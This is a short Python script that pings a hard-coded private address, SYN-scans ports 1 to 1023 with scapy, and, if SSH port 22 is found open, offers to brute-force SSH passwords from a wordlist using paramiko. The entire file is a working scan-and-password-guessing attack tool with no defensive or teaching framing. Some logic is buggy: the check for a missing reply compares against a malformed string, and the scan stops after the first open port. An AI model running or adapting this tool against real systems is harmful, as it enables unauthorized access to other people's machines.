from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP
import paramiko

# target = input("Type target: ")
target = "192.168.3.97"
Registered_Ports = range(1, 1024)
open_ports = []


def brute_force(port):
    with open("PasswordList.txt", 'r') as pass_list:
        password_list = pass_list.read().split('\n')
        user = input("Enter SSH username: ")
        SSHconn = paramiko.SSHClient()
        SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy)

        for passwd in password_list:
            try:
                SSHconn.connect(target, port=int(port), username=user, password=passwd, timeout=1)
                print(f'{passwd} accepted')
                SSHconn.close()
                break
            except:
                print(f'Password {passwd} failed')


def scanport(port):
    source_rand_port = RandShort()
    conf.verb = 0
    synchronization_packet = sr1(IP(dst=target) / TCP(sport=source_rand_port,
                                                      dport=port, flags="S"), timeout=0.5)

    if str(type(synchronization_packet)) != "class <'NoneType'>":
        if synchronization_packet.haslayer(TCP):
            if synchronization_packet.getlayer(TCP).flags == 0x12:
                print(f'Port: {port} is available')
                sr(IP(dst=target) / TCP(sport=source_rand_port, dport=port, flags='R'), timeout=2)
                return True
            else:
                # print(f'Port: {port} is closed')
                return False
        else:
            return False
    else:
        return False


def check_target():
    try:
        conf.verb = 0
        send_icmp_packet = sr1(IP(dst=target)/ICMP(), timeout=3)
        if send_icmp_packet:
            print("Host online")
            for ports in Registered_Ports:
                status = scanport(ports)
                if status is True:
                    print(f'Port {ports} open')
                    open_ports.append(ports)
                    return True
                else:
                    print(f'Port {ports} close')
            print(f'Scanning complete!')
        else:
            print("Host offline")
            return False
    except Exception as error:
        print(f'Exception:  {error}')
        return False


def main():
    if check_target():
        # check_target()
        if 22 in open_ports:
            print(f'list of open ports: {open_ports}')
            want_attack = input('Do you want to perform a brute-force attack? Yes / No ').lower()
            if (want_attack == 'yes') or (want_attack == 'y'):
                brute_force(22)
            else:
                print('End of program')
    else:
        print(f'Target {target} is offline')


if __name__ == '__main__':
    main()


